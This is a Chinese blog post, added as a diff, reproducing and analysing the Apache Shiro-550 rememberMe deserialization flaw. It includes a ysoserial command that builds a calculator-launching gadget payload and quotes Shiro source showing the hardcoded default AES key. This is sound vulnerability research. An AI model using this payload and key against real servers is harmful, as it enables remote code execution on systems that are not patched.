@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro-550 rememberMe 反序列化漏洞分析">
+<meta property="og:url" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="M13n&#39;s Blog">
+<meta property="og:description" content="本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164250014.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164942281.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205182602444.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203026308.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204001354.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203805460.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204617882.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205211522210.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205222540543.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205225320439.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205232236114.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205234932955.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012419243.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216012229514.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011528037.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201216011918348.png">
+<meta property="og:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205223500139.png">
+<meta property="article:published_time" content="2020-12-03T05:01:34.000Z">
+<meta property="article:modified_time" content="2021-02-11T12:00:05.429Z">
+<meta property="article:author" content="M13n">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Shiro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164250014.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Shiro-550 rememberMe 反序列化漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/12/20/ysoserial-URLDNS-%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro-550 rememberMe 反序列化漏洞分析&body=Check out this article: http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Shiro-550 rememberMe 反序列化漏洞分析&description=&lt;p&gt;本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Shiro-550 rememberMe 反序列化漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.</span> <span class="toc-text">漏洞详情</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E6%B5%81%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">加密流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">解密流程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%99%90%E5%88%B6%E3%80%81%E5%9D%91%E7%82%B9%E5%8F%8A%E6%80%9D%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">利用限制、坑点及思考</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-100key-%E8%83%BD%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">为什么 100key 能用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89%E7%9A%84%E9%93%BE%E6%89%93%E4%B8%8D%E4%BA%86"><span class="toc-number">5.2.</span> <span class="toc-text">为什么有的链打不了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E4%BC%B8-resovleClass-%E7%9A%84%E6%95%B0%E7%BB%84%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">5.3.</span> <span class="toc-text">延伸 - resovleClass 的数组类加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JRMP-%E6%94%BB%E5%87%BB"><span class="toc-number">5.4.</span> <span class="toc-text">JRMP 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%80%9D%E8%80%83"><span class="toc-number">5.5.</span> <span class="toc-text">分析思考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro-721-PaddingOracle-CBC-Attack"><span class="toc-number">5.6.</span> <span class="toc-text">Shiro-721 PaddingOracle CBC Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Shiro-550 rememberMe 反序列化漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">M13n's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-12-03T05:01:34.000Z" itemprop="datePublished">2020-12-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Java-Sec/">Java Sec</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Java/" rel="tag">Java</a>, <a class="tag-link-link" href="/tags/Shiro/" rel="tag">Shiro</a>, <a class="tag-link-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>本篇为 Shiro550 (CVE-2016-4437) 的漏洞复现、分析和学习</p>
+<span id="more"></span>
+
+
+
+<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p><a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
+<p>Affects Version/s:1.2.4</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Check 采用空对象</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164250014.png" alt="image-20201213164250014"></p>
+<p>Attack:</p>
+<p>ysoserial POC</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections2 <span class="string">&quot;open -a calculator&quot;</span>|base64 |sed <span class="string">&#x27;:label;N;s/\n//;b label&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Exploit</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164942281.png" alt="image-20201213164942281"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Shiro 1.2.4及以下版本下默认 cookie 中 rememberMe 字段的生成过程</p>
+<blockquote>
+<ol>
+<li>序列化恶意对象（payload） </li>
+<li>对序列化的数据进行AES加密 </li>
+<li>将加密后的数据进行base64编码 </li>
+<li>发送 rememberMe cookie</li>
+</ol>
+</blockquote>
+<p>因此对应服务端的反序列化逻辑推测应该是： 接受 rememberMe cookie -&gt; base64 解码 -&gt; AES 解密 -&gt; 触发反序列化</p>
+<p>所以分析的重点就在 rememberMe 的生成和 服务端反序列化这里</p>
+<h2 id="加密流程"><a href="#加密流程" class="headerlink" title="加密流程"></a>加密流程</h2><p>在一个正常的登录过程中，开启 Remember Me 时。若<strong>成功登录</strong>会触发 <code>AbstractRememberMeManager#onSuccessfulLogin</code></p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205182602444.png" alt="image-20201205182602444"></p>
+<p>分析入口点 <code>AbstractRememberMeManager#onSuccessfulLogin</code> </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccessfulLogin</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isRememberMe(token)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">        log.debug(<span class="string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关键点1:  <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> 和  <code>org.apache.shiro.mgt.AbstractRememberMeManager#isRememberMe</code>  判断是否启用了 Remember Me 功能</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203026308.png" alt="image-20201205203026308"></p>
+<p><code>principals</code> 对象在 <code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code> 创建</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204001354.png" alt="image-20201205204001354"></p>
+<p><code>principals</code>  的值</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203805460.png" alt="image-20201205203805460"></p>
+<p>关键点2：序列化、加密对象</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204617882.png" alt="image-20201205204617882"></p>
+<p>依次看一下序列化这一步的步骤</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytes</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager.serialize</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] serialize(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getSerializer().serialize(principals);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.io.DefaultSerializer#serialize</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(T o) <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String msg = <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(baos);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">            oos.writeObject(o);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var6) &#123;</span><br><span class="line">            String msg = <span class="string">&quot;Unable to serialize object [&quot;</span> + o + <span class="string">&quot;].  &quot;</span> + <span class="string">&quot;In order for the DefaultSerializer to serialize this object, the [&quot;</span> + o.getClass().getName() + <span class="string">&quot;] &quot;</span> + <span class="string">&quot;class must implement java.io.Serializable.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SerializationException(msg, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.subject.SimplePrincipalCollection#writeObject</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    out.defaultWriteObject();</span><br><span class="line">    <span class="keyword">boolean</span> principalsExist = !CollectionUtils.isEmpty(<span class="keyword">this</span>.realmPrincipals);</span><br><span class="line">    out.writeBoolean(principalsExist);</span><br><span class="line">    <span class="keyword">if</span> (principalsExist) &#123;</span><br><span class="line">        out.writeObject(<span class="keyword">this</span>.realmPrincipals);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后是在 <code>org.apache.shiro.io.DefaultSerializer#serialize</code> 的 <code>toByteArray</code>  返回的字节码</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205211522210.png" alt="image-20201205211522210"></p>
+<p>再依次看一下加密这一步的步骤</p>
+<p>在看这个之前需要先看当前类的构造方法</p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205222540543.png" alt="image-20201205222540543"></p>
+<p>设置 AES 的各个信息 <code>org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService</code></p>
+<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205225320439.png" alt="image-20201205225320439"></p>
+<p>进入加密步骤</p>
+<p>第一部分</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytes</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span></span><br><span class="line"><span class="comment">* 后面先进入 this.getCipherService(); 的分析</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.mgt.AbstractRememberMeManager#getCipherService</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CipherService <span class="title">getCipherService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cipherService;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * org.apache.shiro.mgt.AbstractRememberMeManager</span></span><br><span class="line"><span class="comment"> * 这个是在该类调用构造方法初始化的时候就附值的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractRememberMeManager</span> <span class="keyword">implements</span> <span class="title">RememberMeManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> CipherService cipherService = <span class="keyword">new</span> AesCipherService();</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.crypto.AesCipherService</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AesCipherService</span> <span class="keyword">extends</span> <span class="title">DefaultBlockCipherService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ALGORITHM_NAME = <span class="string">&quot;AES&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AesCipherService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">DefaultBlockCipherService</span><span class="params">(String algorithmName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(algorithmName);</span><br><span class="line">    <span class="keyword">this</span>.modeName = OperationMode.CBC.name();</span><br><span class="line">    <span class="keyword">this</span>.paddingSchemeName = PaddingScheme.PKCS5.getTransformationName();</span><br><span class="line">    <span class="keyword">this</span>.blockSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.streamingModeName = OperationMode.CBC.name();</span><br><span class="line">    <span class="keyword">this</span>.streamingPaddingSchemeName = PaddingScheme.PKCS5.getTransformationName();</span><br><span class="line">    <span class="keyword">this</span>.streamingBlockSize = <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span></span><br><span class="line"><span class="comment">* 运行刚刚这个类的后半部分</span></span><br><span class="line"><span class="comment">* 这里 cipherService 确定了加密类型等</span></span><br><span class="line"><span 